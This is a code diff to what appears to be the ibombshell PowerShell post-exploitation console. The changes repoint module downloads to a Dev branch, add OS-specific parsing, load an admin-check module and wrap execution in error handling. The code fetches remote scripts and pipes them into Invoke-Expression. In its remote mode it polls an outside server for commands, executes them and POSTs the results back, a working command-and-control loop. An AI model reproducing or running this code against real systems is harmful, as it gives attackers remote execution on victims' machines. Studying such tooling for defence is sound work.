@@ -19,6 +19,7 @@ function console{
         )
 
         $RawURL = $RawBase + $RawFunctions + $command
+
         return (iwr -UseBasicParsing -Headers @{"Cache-Control"="no-cache"}  -uri $RawURL).Content
 
     }
@@ -32,9 +33,9 @@ function console{
 
     
     #Important: URL download ibombshell
-    $gtRawBase = "https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/"
+    $gtRawBase = "https://raw.githubusercontent.com/ElevenPaths/ibombshell/Dev/"
     $gtRawFunctions = "data/functions/"
-    $functionsList = "https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/functions.txt"
+    $functionsList = "https://raw.githubusercontent.com/ElevenPaths/ibombshell/Dev/functions.txt"
     [System.Collections.ArrayList]$global:functionsLoaded = "showcommands" , "showfunctions" , "quit"
     #Condition for exit
     $global:condition = $true
@@ -59,15 +60,17 @@ function console{
         #getting function's list
         $list = (new-object net.webclient).downloadstring($functionsList)
         loader -command "system/detect-OS" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-        if(detect-OS == "windows")
-        {
-            $delimet = "`r`n"
-        }
-        else
-        {
+    
+         $detected_os = detect-OS -basic 
+        if($detected_os -eq "windows") {
+	        $delimet = "`n"
+            $delimet2 = "`r`n"
+        } else {
             $delimet = "`n"
+            $delimet2 = "`n"
         }
         $global:commandList = $list.split($delimet)
+	    $localcommandlist = $list.split($delimet2)
         #loader functions default
         loader -command "showfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
         loader -command "showcommands" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
@@ -76,6 +79,7 @@ function console{
         loader -command "quit" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
         loader -command "saveandloadfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
         loader -command "version" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+        loader -command "isadmin" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
         loader -command "print/printprompt" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
         loader -command "print/messagedata" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
         addcommand -command "savefunctions"
@@ -85,6 +89,8 @@ function console{
         clear-host
         write-host -ForegroundColor Yellow $banner
         write-host 
+        write-host -ForegroundColor Red "Use showcommands to see what can be loaded or showfunctions to see what can be run"
+        write-host
     }
 
     while($global:condition)
@@ -97,8 +103,12 @@ function console{
             {
                 $content = (iwr -UseBasicParsing -Uri "$uriConsole/ibombshell/$id").content 
                 if($content.length -gt 0)
-                {
-                    $results = $content | iex
+                { 
+                    try {
+                        $results = $content | iex
+                    } catch {
+                        $results = "Error executing the command"
+                    }
 
                     #Send results
                     if ($results.GetType().Name -eq "String")
@@ -114,8 +124,9 @@ function console{
                         }
                         iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$send}
                     }
+                } 
 
-                }
+                
                 sleep 5
             }
             else
@@ -128,11 +139,15 @@ function console{
         {
             printprompt
             $command = Read-Host  
-
-            if(($command.Length -eq 0)-or($command.StartsWith(" ")))
+	        $command = $command.TrimStart()
+            if(($command.Length -eq 0))
             {
                 continue
-            }      
+            }
+            if ($command -eq  "cls" -or $command -eq "clear") {
+                cls | iex
+                continue
+            } 
             if ((commandsearch -command $command.split(" ")[0] -list $functionsLoaded)-and($command.Split(" ")[0].Equals("loaderext")))
             {
                 $command | iex | iex
@@ -142,23 +157,28 @@ function console{
                 #$command
                 $command | iex
             }
-            elseif (commandsearch -command $command -list $commandList)
+            elseif (commandsearch -command $command -list $localcommandlist)
             {
-                #loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions
-                loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
-                printMessage -message "Function Loaded"
-                addcommand -command $command 
+                try {
+                    $result = addcommand -command $command 
+                    if ($result -ne -1) {
+                        #loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions
+                        loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
+                        printMessage -message "Function Loaded"
+                    }else{
+                    printMessage -message "That function is already loaded"
+                    }
+                } catch {
+                    printMessage -message "Something went wrong loading the module"
+                    printMessage -message "$_.Exception.Message"
+                    $global:functionsLoaded.removeat($result)
+                }
             }
             else
             {
                 printMessage -message "Stupid Command!"
             }
-
         }
-
     }
 
 }
-
-
-
